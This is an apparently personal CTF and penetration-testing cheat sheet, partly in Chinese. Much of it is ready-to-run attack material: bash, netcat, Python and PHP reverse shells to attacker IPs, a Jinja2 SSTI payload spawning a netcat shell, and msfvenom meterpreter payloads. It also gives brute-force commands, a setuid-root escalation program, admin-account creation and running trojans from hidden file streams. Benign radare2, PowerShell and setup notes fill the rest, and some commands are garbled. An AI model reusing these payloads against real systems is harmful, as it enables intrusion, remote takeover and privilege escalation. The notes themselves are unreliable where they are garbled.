https://github.com/JohnHammond/ctf-katana
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6   // jwk crack learn

export $IP=127.0.0.1

gobuster -u url -w /opt/directory-list-2.3=medium.txt  -x php ,sh,txt,cgi,html,js,css,py,bak,~

nikto -h url | tee nikto.log

nmap   -sC -sV oN  dir -v  IP/directory
msfvenom -p php/meterpreter/reverse_tcpLHOST=192.168.2.146 LPORT=5555 R > test3.php  #msf 生成php shell 
grep -Ri 
grep -oE 用正则表达式搜索

nmap -p80 hostip --script=http-brute  --script-args userdb=wordlist.txt,passdb=passlist.txt,http-brute.path=/test #破解http authenication认证
hydra  -L user.txt -P pass.txt -s port -f hostip http-get /uri   也可以破解http authenication 认证

"python -c 'import pty;pty.spawn(\"/bin/bash\")'"
export xterm=TERM
ctrl+z
stty raw -echo; fg

ssti get jinja2 shell:"{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.9.171.166 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}"
php://filter/convert.base64-encode/resource=index

ssh username@ipadderss -p port


sudo -l

find  / -user [用户名如 root] 2>/dev/null (查找该用户的所有文件)

xxd

find / -perm ug=rwx 2>/dev/null


cewl url://ip/index.txt -w wordlist.txt 将一个网页上的字符生成密码字典

gobuster -w -q -p  http://ip/index.php -e txt php jsp css ..
feroxbuster -t 10 -u https://www.example.com -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -x py,html,txt -o feroxbuster 

nc -lvp (192.168.0.1) 4444
nc 192.168.0.1 4444 -e /bin/bash  连接到192.168.0.1 4444 并弹一个shell给192.168.0.1
/bin/bash -i &> /dev/tcp/10.0.0.123/1111 0>&1
1、bash -i 创建一个交互式shell, 
2、&>  将1标准输入出，2标准输入重定向
2、/dev/tcp/ip/host 表示创建一个 ip:host socket 连接。
3 bash -i &> /dev/tcp/ip/host 表示将 bash -i &> 交互式shell的输出及标准输出，标准错误重定向到 /dev/tcp/ip/host 的socket 

4、0>&1 = <&1 = 0<&1 表示将 标准输入重定向到标准输出.也就是在靶机上输入任何命令不回显，因为输入和结果已经发送到了攻击机上了
这个命令的整个意思是  在创建一个交互式的shell, 将标准输入重定向到标准输出，再将标准输出重定向到 /dev/tcp/ip/host 的socket上 。 也就是靶机反弹一个shell给攻击机.

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.123",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
php -r '$sock=fsockopen("10.0.0.123",1111);exec("/bin/sh -i <&3 >&3 2>&3");'


linux一个提权程序
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
	setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}

kali 安装chrome 
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
apt install ./google-chrome-stable_current_amd64.deb
vim chrome.sh  << /usr/bin/google-chrome-stable %U --no-sandbox --user-data-dir &
chmod +x chrome.sh 
./chrome.sh

curl https://www.examples.com -k  -k参数免于访问证书

windows search file use dos command line: c: dir /s /p filename

wordpress brote force username use : wpscan --url http://IP/   --enumerate u 

server run nfs: use  showmount -e serverIP   
mount nfs sharefloder /tmp/ngfs
ls /tmp/ngfs

volatility--命令参数
https://github.com/volatilityfoundation/volatility/wiki/Command-Reference

powershell:

ssh -l username ip  通过ssh 链接powershell

Get-childItem -file -filter -recurse -hidden -erroraction silentlycontinue 
#-file 查找文件  -recurse 递归  -hidden 隐藏  -dirctory 目录  -erroraction silentlycontinue 错误安静模式
#-filter 过滤 查找某个文件名 "*file*"

Get-Content 浏览文件内容   get-tencont file.txt| Measure-Object -word 计算文件内有多少word
(Get-Content -Path file.txt)[index]  查找第index个word

Set-Location -Path c:\users\administrator\desktop 切换目录
Select-String -Path 'c:\users\administrator\desktop' -Pattern '*.pdf' 查找包含pdf字符串的文件

Get-FileHash -Algorithm MD5 file.txt 计算file.txt的md5
c:\Tools\strings64.exe -accepteula file.exe  浏览二进制文件file.exe的字符串

下面两个命令可以检查某个可执行文件中是否隐藏木马文件
Get-Item -Path file.exe -Stream * 在文件file.exe中查找所有stream ，这个stream可能是个隐藏的exe文件,尤其要关注stream和legth字段的值
接上一行,运行wmic process call create $("c://file.exe:streamname")可以执行包含的streamname文件,通过这种方式可以执行可执行文件中包含的可执行木马文件

Http_header 包含IP的参数:X-Forwarded-For,X-Forwarded-Host,X-Client-IP,X-Remote-IP,X-Remote-Addr,X-Host

在linux 主机上建立一个稳定的shell ,第一：nc -lnvp port;第二： python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm;第三:按下ctrl+z键;第四 ：输入  stty raw -echo;fg

metasploit shell payload分为两种，一种是staged ,一种是stageless.
staged 的shell 分为两个部分，一部分为一段小代码用与客户与服务器链接，另一部分用于从攻击机上下载一段代码到目标机，并执行。
stageless 的shell只有一部分，直接完成staged shell的所有功能

staged 的shell命名规则为 os /arch /shellname  例如  windows/x64/shell_reverse_tcp 而stageless的命名规则为windows/x64/shell/reverse_tcp,区别是一个用/,一个用_
staged的shell更稳定，不容易被杀毒软件发现，stageless更容易被发现。

msfvenom -p payload -f (.exe,.elf,.python,.asp,.php) -o filename lhost=127.0.0.1 lport=4444
msfvenom -p windows/x86/meterprete/reverse_tcp -f .exe -o shell.exe lhost=192.168.0.2 lport=4444
在metasplot中要选择 multi/handler 来发射 windows/x86/meterpreter/reverse_tcp 与上面的shell paylaod相对应


Windows系统增加用户的命令
net user <username> <password> /add

net localgroup administrators <username> /add
msconfig :系统配置
compmgmt.exe：计算机管理
resmon.exe:资源管理
msinfo32.exe: 系统信息
control.exe: 控制面板   control /name microsoft.windowsupdate windos更新
useraccountcontrolsetting.exe:用户故障诊断
lusrmgr.msc：用户管理
appwiz.cpl:安装删除程序
taskmgr ：任务管理器
wf.msc :防火墙 

############################install radare2
wget https://github.com/radare/radare2/archive/4.3.1.tar.gz
~ $ tar xzvf 4.3.1.tar.gz
~ $ cd radare2-4.3.1/
~/radare2-4.3.1 $ ./configure --prefix=/usr
~/radare2-4.3.1 $ make -j8
~/radare2-4.3.1 $ sudo make install

aaa 分析所有数据
af 基本的分析函数
afl 分析所有函数

pdf @function 打印函数反汇编
db 设置断点
dc 继续执行
ds 单步执行进
dso 单步执行出
px @address 
dr register 查看寄存及内容

ia 分析二进制文件的所有信息
izz 查看二进制文件的strings

j 再所有命令行后面加j,以json方式显示
ie 查看文件的入口地址

s 打印当前程序所在的二进制文件的内存地址
s+ 5 从当前ip向前执行5条指令
s- 12 向后退执行12步
ss 撤销上次的seek
s main 从mian函数开始执行
sr rax 到rax的内存地址

px 以16进制打印一个内存地址数据
pd 以汇编形式打印当前内存地址数据
pdf @main
pxe 以娱乐方式打印某个内存地址数据

pc 以行或者列的方式显示内存地址数据

debug模式:
db 设置断点
dr @rax 显示某个寄存器内容
dc 继续执行
ds 单步执行
ds 2 向前执行两步
dbi 显示所有断点列表

wx 值 @address 向内存地址写入值
wa jnz address :写入汇编代码
wci 提交所有改变
wc  列出所有可写
wcr 重设变化
wtf 文件名  写入文件
wz string写入以\0结束字符窜
w streing 写入字符串
w0 [n] : write n 0x00
vv 可视模式

vq 退回shell模式
vs 单步执行
v: 在图形模式下执行命令行
v; 增加评论或者注释


GCC 编译 关闭 NX, Canary ,PIE ,RELRO选项
NX：-z execstack / -z noexecstack (关闭 / 开启)
Canary： -fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)
PIE：-no-pie / -pie (关闭 / 开启)
RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)


ubuntu21. windows 10 vmware共享文件夹看不到的情况解决办法：

sudo /etc/fstab/
添加：vmhgfs-fuse    /mnt/hgfs    fuse    defaults,allow_other    0    0
